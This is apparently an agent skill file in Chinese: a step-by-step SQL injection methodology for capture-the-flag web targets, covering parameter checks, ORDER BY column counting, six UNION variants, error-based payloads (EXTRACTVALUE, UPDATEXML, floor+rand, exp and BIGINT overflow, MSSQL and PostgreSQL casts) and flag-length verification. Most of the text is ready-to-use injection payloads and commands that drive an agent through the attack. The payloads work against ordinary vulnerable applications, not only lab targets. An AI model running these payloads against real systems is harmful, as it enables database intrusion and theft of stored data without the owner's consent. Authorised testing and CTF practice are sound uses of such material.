---
name: sql-injection-methodology
description: "SQL注入检测、利用、绕过的完整方法论。当目标有表单提交、登录页面、搜索功能、数据查询接口时使用。包含POST参数完整性检查、EXTRACTVALUE截断陷阱、UNION/报错/盲注/sqlmap全流程"
metadata:
  tags: "sqli,sql injection,injection,database,bypass,waf,login,search,form,SQL注入,boolean-based,盲注,报错注入"
  category: "exploit"
  mitre_attack: "T1190,T1059"
---

# SQL 注入完整方法论


## ⛔ 深入参考（Phase 3 截断时必读！）

- UNION/报错注入 payload + EXTRACTVALUE 自动提取 Python 脚本 → [references/union-and-error.md](references/union-and-error.md)
- 布尔盲注/时间盲注 + 自动化 Python 脚本 → [references/blind-injection.md](references/blind-injection.md)
- WAF 绕过 + sqlmap → [references/waf-bypass-sqlmap.md](references/waf-bypass-sqlmap.md)
- 二次注入/堆叠注入/INSERT-UPDATE/SQLite/INTO OUTFILE → [references/advanced-injection.md](references/advanced-injection.md)
- 数据库特定注入技术（MSSQL/Oracle/PostgreSQL/Access） → [references/db-specific-injection.md](references/db-specific-injection.md)

---

## Phase 0: POST 参数完整性（最先执行！）

1. analyze_response 提取**所有** input/button 的 name（含 hidden、submit）
2. **必须包含 submit 按钮** — PHP 用 `isset($_POST['submit'])` 做验证
3. 异常: 注入 `'` 和正常值响应相同 → 缺参数，立即检查

## Phase 1: 注入点发现 + 列数确认

1. 单引号 `'` 测试 → 有报错即存在注入
2. **ORDER BY 二分法**确定精确列数（⛔ 禁止从 1 逐个递增）:
   ```
   ORDER BY 10 → 错误 → ORDER BY 5 → 成功 → ORDER BY 8 → 错误
   → ORDER BY 6 → 成功 → ORDER BY 7 → 错误 → 列数 = 6
   ```
   ⛔ **ORDER BY N 成功 ≠ 列数是 N！必须找到 N+1 失败的边界才能确认**

## Phase 2: UNION 注入（首选！必须穷尽 6 种变体后才能放弃）

UNION 无截断限制，一次拿完整 flag。**必须按以下顺序尝试所有 6 种变体**:

```sql
-- ① 标准 UNION（让原查询空）
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- 
-- ② NULL 代替数字
' AND 1=2 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
-- ③ 不同注释符
' AND 1=2 UNION SELECT 1,2,3,4,5,6#
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- -
-- ④ 大小写/注释绕过
' AND 1=2 UNiON SeLeCT 1,2,3,4,5,6-- 
-- ⑤ 检查回显位: 响应中出现了哪个数字(2/3/4)？该位置放查询
' AND 1=2 UNION SELECT 1,database(),3,4,5,6-- 
-- ⑥ 检查完整 HTML 源码（不只是摘要），搜索数字 1-6 是否在隐藏元素中
```

**策略**：一旦某个变体成功找到回显位（响应中出现数字），立即用该变体提取数据，无需继续测试剩余变体。全部失败才转 Phase 3。

## Phase 3: 报错注入（UNION 失败后使用，截断陷阱！）

报错注入有多种方式，**按优先级尝试**（某种被过滤就换下一种）：

### 方式 1: EXTRACTVALUE（首选，MySQL 5.1+）
最多返回 32 字符：
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- 
```

### 方式 2: UPDATEXML（EXTRACTVALUE 被过滤时）
```sql
' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- 
```

### 方式 3: floor+rand（MySQL 经典，兼容性最好）
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
```

### 方式 4: exp() 溢出（MySQL 5.5.5-5.5.49）
```sql
' AND exp(~(SELECT*FROM(SELECT database())a))-- 
```

### 方式 5: BIGINT 溢出
```sql
' AND !(SELECT*FROM(SELECT database())a)-~0-- 
```

**数据库差异**：
- MSSQL: `' AND 1=CONVERT(int,@@version)--` 或 `' AND 1=CAST(db_name() AS int)--`
- PostgreSQL: `' AND 1=CAST(version() AS int)--`

### ⛔⛔⛔ 提取 flag 值时：禁止手动 SUBSTRING 拼接！必须用脚本！

**触发条件**: EXTRACTVALUE 返回的 flag 被截断（< 预期长度）
**强制动作**: 
1. ⛔ **立即执行** [references/union-and-error.md](references/union-and-error.md) 获取 Python 自动提取脚本
2. 用 bash 执行该 Python 脚本（自动分段 + 拼接 + LENGTH 验证）
3. ⛔ 绝不手动写 SUBSTRING → 手动拼 hex 必丢字符 → 已连续 2 次导致任务失败

## Phase 4: ⛔ Flag 交付前强制验证（无论用了什么注入方式）

**在报告 flag 之前，必须全部通过以下检查，否则不得报告：**

```sql
-- 1. 查询真实长度
' AND EXTRACTVALUE(1,CONCAT(0x7e,LENGTH((SELECT flag FROM flag))))-- 
```

| 检查项 | 方法 | 不通过处理 |
|--------|------|-----------|
| 长度匹配 | `len(flag) == LENGTH()` 返回值 | 重新提取，不得报告 |
| 格式正确 | 以 `flag{` 开头 `}` 结尾 | 重新提取 |
| Hash 合理性 | `flag{...}` 中 hash 长度通常是 32/40/64 | 长度异常则重新提取 |

⛔ **跳过此验证直接报告 flag = 任务失败。这是最后防线。**

## POST 参数完整性
- curl 和浏览器差异：浏览器自动发送某些参数，curl 需手动添加
